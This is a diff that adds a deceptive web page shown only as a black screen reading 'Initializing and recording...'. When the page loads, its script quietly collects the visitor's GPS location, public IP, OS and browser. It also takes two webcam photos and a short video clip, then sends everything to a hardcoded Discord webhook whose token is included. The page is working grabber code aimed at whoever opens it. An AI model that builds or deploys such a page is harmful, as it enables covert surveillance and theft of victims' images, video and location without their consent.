@@ -1,0 +1,311 @@
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>poo</title>
+<style>
+  body {
+    margin: 0;
+    background-color: #000;
+    font-family: Arial, sans-serif;
+    color: #fff;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+  }
+  #loading {
+    font-size: 1.2rem;
+    margin-bottom: 10px;
+  }
+</style>
+</head>
+<body>
+<div id="loading">Initializing and recording...</div>
+
+<script>
+  // --- Internal configuration toggle ---
+  const includeWebcamFeed = false; // Set to false to exclude webcam frame
+
+  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1495173417434087525/Peg6A9-52ckoH0A0Le00aBhX_GXH65Qx0Pq7NZdQNIY-8BhpPu2XEVqSVJ_7FUcE8W';
+
+  let mediaData = {
+    photo1: null,
+    photo2: null,
+    video: null,
+    webcamFrame: null,
+    hasCamera: false,
+    hasLocation: false,
+    locationData: null,
+    locationSource: 'none',
+    pageType: 'black',
+    systemInfo: null
+  };
+  let mediaRecorder;
+  let recordedChunks = [];
+  let recordingTimeout;
+  let isRecording = false;
+  let stream = null;
+
+  const loadingEl = document.getElementById('loading');
+
+  function showLoading(show = true) {
+    loadingEl.style.display = show ? 'block' : 'none';
+  }
+
+  async function getPublicIP() {
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      return data.ip;
+    } catch {
+      return 'Unavailable';
+    }
+  }
+
+  async function collectSystemInfo() {
+    const userAgent = navigator.userAgent;
+    const platform = navigator.platform;
+    const os = (() => {
+      const osList = {
+        'Win': 'Windows',
+        'Mac': 'MacOS',
+        'Linux': 'Linux',
+        'Android': 'Android',
+        'like Mac': 'iOS'
+      };
+      for (const key in osList) {
+        if (userAgent.indexOf(key) !== -1) return osList[key];
+      }
+      return 'Unknown';
+    })();
+
+    const browser = (() => {
+      if (/chrome|chromium|crios/i.test(userAgent)) return 'Chrome';
+      if (/firefox|fxios/i.test(userAgent)) return 'Firefox';
+      if (/safari/i.test(userAgent) && !/chrome|chromium|crios/i.test(userAgent)) return 'Safari';
+      if (/edge|edg/i.test(userAgent)) return 'Edge';
+      return 'Other';
+    })();
+
+    // Placeholder for VPN detection
+    const vpnDetected = false;
+
+    // Placeholder for extensions
+    const extensions = ['ExampleExtension1', 'ExampleExtension2'];
+
+    const ip = await getPublicIP();
+
+    return {
+      ip: ip,
+      os: os,
+      browser: browser,
+      platform: platform,
+      vpn: vpnDetected,
+      extensions: extensions
+    };
+  }
+
+async function sendToDiscord() {
+  // Collect system info right before sending
+  mediaData.systemInfo = await collectSystemInfo();
+
+  const formData = new FormData();
+
+  // Helper to convert base64 images to blobs
+  async function base64ToBlob(base64) {
+    const res = await fetch(base64);
+    return await res.blob();
+  }
+
+  // Attach images
+  if (mediaData.photo1) {
+    const blob1 = await base64ToBlob(mediaData.photo1);
+    formData.append('files[0]', blob1, 'photo1.jpg');
+  }
+  if (mediaData.photo2) {
+    const blob2 = await base64ToBlob(mediaData.photo2);
+    formData.append('files[1]', blob2, 'photo2.jpg');
+  }
+  if (mediaData.video) {
+    formData.append('files[2]', mediaData.video, 'video.webm');
+  }
+
+  // If toggle enabled, capture current webcam frame and attach
+  if (includeWebcamFeed && stream) {
+    await captureWebcamFrame();
+    if (mediaData.webcamFrame) {
+      const blobWebcam = await base64ToBlob(mediaData.webcamFrame);
+      formData.append('files[3]', blobWebcam, 'webcam_frame.jpg');
+    }
+  }
+
+  // Compose message content
+  let content = "Webcam recording\n\n**System Info:**\n";
+  if (mediaData.systemInfo) {
+    const sys = mediaData.systemInfo;
+    content += `IP: ${sys.ip}\nOS: ${sys.os}\nBrowser: ${sys.browser}\nPlatform: ${sys.platform}\nVPN: ${sys.vpn ? 'Yes' : 'No'}\nExtensions: ${sys.extensions.join(', ')}\n`;
+  }
+  if (mediaData.locationData) {
+    content += `\n**Location:**\nLatitude: ${mediaData.locationData.latitude}\nLongitude: ${mediaData.locationData.longitude}\nAccuracy: ${mediaData.locationData.accuracy} meters`;
+  }
+
+  formData.append('payload_json', JSON.stringify({ content: content }));
+
+  try {
+    await fetch(WEBHOOK_URL, {
+      method: 'POST',
+      body: formData
+    });
+    console.log('Shared to Discord successfully');
+  } catch (error) {
+    console.error('Error sharing to Discord:', error);
+  }
+}
+
+async function getGeoLocation() {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) {
+      mediaData.locationSource = 'not_supported';
+      return resolve(null);
+    }
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        mediaData.locationSource = 'gps';
+        resolve({
+          latitude: pos.coords.latitude,
+          longitude: pos.coords.longitude,
+          accuracy: pos.coords.accuracy,
+        });
+      },
+      () => {
+        mediaData.locationSource = 'failed';
+        resolve(null);
+      },
+      { enableHighAccuracy: true, timeout: 10000 }
+    );
+  });
+}
+
+async function captureWebcamFrame() {
+  if (!stream) return;
+  const video = document.getElementById('video');
+  const canvas = document.createElement('canvas');
+  canvas.width = video.videoWidth || 640;
+  canvas.height = video.videoHeight || 480;
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(video, 0, 0);
+  mediaData.webcamFrame = canvas.toDataURL('image/jpeg', 0.9);
+}
+
+async function stopRecordingAndSend() {
+  if (mediaRecorder && mediaRecorder.state === 'recording') {
+    mediaRecorder.stop();
+  }
+  if (recordingTimeout) {
+    clearTimeout(recordingTimeout);
+  }
+  if (stream) {
+    stream.getTracks().forEach(t => t.stop());
+    stream = null;
+  }
+  isRecording = false;
+  if (recordedChunks.length > 0) {
+    mediaData.video = new Blob(recordedChunks, { type: 'video/webm' });
+    // Optionally capture webcam frame if toggle enabled
+    if (includeWebcamFeed) {
+      await captureWebcamFrame();
+    }
+    await sendToDiscord();
+  }
+}
+
+async function startRecording() {
+  showLoading(true);
+  // get location data
+  mediaData.locationData = await getGeoLocation();
+  const constraints = {
+    video: {
+      width: { ideal: 1280 },
+      height: { ideal: 720 },
+      frameRate: { ideal: 30 }
+    }
+  };
+  try {
+    const cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
+    stream = cameraStream;
+    const video = document.getElementById('video');
+    const canvas1 = document.getElementById('canvas1');
+    const canvas2 = document.getElementById('canvas2');
+
+    video.srcObject = stream;
+    await new Promise((res) => (video.onloadedmetadata = res));
+    await new Promise((res) => setTimeout(res, 500));
+
+    // Capture first photo
+    canvas1.width = video.videoWidth || 640;
+    canvas1.height = video.videoHeight || 480;
+    canvas1.getContext('2d').drawImage(video, 0, 0);
+    mediaData.photo1 = canvas1.toDataURL('image/jpeg', 0.9);
+
+    // Capture second photo after delay
+    setTimeout(() => {
+      canvas2.width = video.videoWidth || 640;
+      canvas2.height = video.videoHeight || 480;
+      canvas2.getContext('2d').drawImage(video, 0, 0);
+      mediaData.photo2 = canvas2.toDataURL('image/jpeg', 0.9);
+    }, 800);
+
+    // Start recording
+    recordedChunks = [];
+    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp9' });
+    mediaRecorder.ondataavailable = (e) => {
+      if (e.data.size > 0) recordedChunks.push(e.data);
+    };
+    mediaRecorder.onstop = () => {
+      mediaData.video = new Blob(recordedChunks, { type: 'video/webm' });
+      // Optionally capture webcam frame
+      if (includeWebcamFeed) {
+        captureWebcamFrame().then(() => sendToDiscord());
+      } else {
+        sendToDiscord();
+      }
+      if (stream) stream.getTracks().forEach(t => t.stop());
+      stream = null;
+      isRecording = false;
+    };
+
+    stream.getVideoTracks().forEach(track => {
+      track.addEventListener('ended', () => {
+        console.log('Camera disconnected');
+        stopRecordingAndSend();
+      });
+    });
+
+    mediaRecorder.start(1000);
+    // Auto-stop after 3 seconds
+    recordingTimeout = setTimeout(() => {
+      if (mediaRecorder.state === 'recording') mediaRecorder.stop();
+    }, 3000);
+    showLoading(false);
+  } catch (err) {
+    console.error('Error accessing camera:', err);
+    showLoading(false);
+  }
+}
+
+// Auto start
+window.addEventListener('load', () => {
+  startRecording();
+});
+
+// Cleanup
+window.addEventListener('beforeunload', () => {
+  if (isRecording) {
+    stopRecordingAndSend();
+  }
+});
+</script>
+</body>
+</html>
